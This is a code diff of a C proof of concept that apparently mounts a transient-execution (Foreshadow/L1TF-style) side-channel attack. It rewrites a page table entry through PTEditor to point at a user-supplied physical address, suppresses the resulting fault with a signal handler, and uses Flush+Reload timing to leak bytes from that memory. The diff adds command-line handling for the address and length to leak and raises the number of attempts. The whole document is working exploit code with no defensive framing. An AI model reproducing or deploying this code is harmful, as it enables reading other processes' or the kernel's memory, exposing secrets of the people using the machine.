@@ -17,11 +17,14 @@
 extern uint64_t reload_label(void);
 
 #define REG_RIP 16
+#pragma GCC diagnostic push
+#pragma GCC diagnostic ignored "-Wunused-parameter"
 static void segfault_handler(int sig, siginfo_t *info, void *ucontext) {
   ucontext_t *uc = (ucontext_t *)ucontext;
   greg_t *rip = &uc->uc_mcontext.gregs[REG_RIP];
   *rip = (uint64_t)&reload_label;
 }
+#pragma GCC diagnostic pop
 
 int main(int argc, char *argv[argc]) {
   // Step 1: Create a variable
@@ -30,12 +33,28 @@ int main(int argc, char *argv[argc]) {
   // Step 3: FLUSH reload buffer
   // Step 4: Speculatively access variable
   // Step 5: RELOAD reload buffer
+  assert(argc > 0);
+  if (argc != 3) {
+    fprintf(stderr, "Usage: %s [physical address to leak in hex] [length]\n",
+            argv[0]);
+    exit(1);
+  }
+
+  char *tail = NULL;
+  uintptr_t phys_addr = strtoull(argv[1], &tail, 16);
+  assert(tail != argv[1]);
+  size_t pfn = (phys_addr & ~(0xfff)) >> 0xc;
+
+  tail = NULL;
+  size_t length = strtoull(argv[2], &tail, 10);
+  assert(tail != argv[2]);
+  assert((phys_addr & 0xfff) + length < PAGE_SIZE);
+
+  fprintf(stderr, "Attempting to leak %ld bytes from %p\n", length,
+          (void *)phys_addr);
 
   void *leak = mmap(NULL, PAGE_SIZE, PROT_WRITE | PROT_READ,
                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
-
-  assert(!ptedit_init());
-
   void *reload_buffer =
       mmap(NULL, VALUES_IN_BYTE * PAGE_SIZE, PROT_WRITE | PROT_READ,
            MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
@@ -43,25 +62,12 @@ int main(int argc, char *argv[argc]) {
 
   size_t threshold = 150;
 
-  assert(argc >= 2);
-  char *tail = NULL;
-  size_t pfn = strtol(argv[1], &tail, 16);
-  assert(tail != argv[1]);
-  printf("Trying PFN of 0x%lx\n", pfn);
-
+  // Modify the PFN
+  assert(!ptedit_init());
   assert(!mprotect(leak, PAGE_SIZE, PROT_NONE));
   size_t leak_original_pfn = ptedit_pte_get_pfn(leak, 0);
   ptedit_pte_clear_bit(leak, 0, PTEDIT_PAGE_BIT_PRESENT);
   ptedit_pte_set_pfn(leak, 0, pfn);
-  // ptedit_pte_set_bit(leak, 0, PTEDIT_PAGE_BIT_GLOBAL);
-
-  //
-  // printf("Accessing invalid variable to bring it in TLB\n");
-  // if (setjmp(deliberate_segfault)) {
-  //   printf("Variable is %lx\n", *(uint64_t *)leak);
-  // }
-  // sa.sa_handler = SIG_DFL;
-  // sigaction(SIGSEGV, &sa, NULL);
 
   struct sigaction sa = {0};
   sa.sa_handler = (void *)segfault_handler;
@@ -69,13 +75,14 @@ int main(int argc, char *argv[argc]) {
 
   memset(reload_buffer, 0, VALUES_IN_BYTE * PAGE_SIZE);
 
-  for (int j = 0; j < PAGE_SIZE; j += 1) {
+  size_t start = (phys_addr & 0xfff);
+  for (size_t j = start; j < start + length; j += 1) {
     size_t results[VALUES_IN_BYTE] = {0};
     void *leak_addr = (char *)leak + j;
 
     // printf("pfn after set %lx\n", ptedit_pte_get_pfn(leak, 0));
 
-    for (int i = 0; i < 10; ++i) {
+    for (int i = 0; i < 100; ++i) {
       flush(VALUES_IN_BYTE, PAGE_SIZE, reload_buffer);
       asm volatile("xor %%rax, %%rax\n"
                    "movb (%0), %%al\n"
@@ -101,7 +108,6 @@ int main(int argc, char *argv[argc]) {
       }
     }
   }
-
   // Restore the segfault handler back to normal
   sa.sa_handler = SIG_DFL;
   sigaction(SIGSEGV, &sa, NULL);
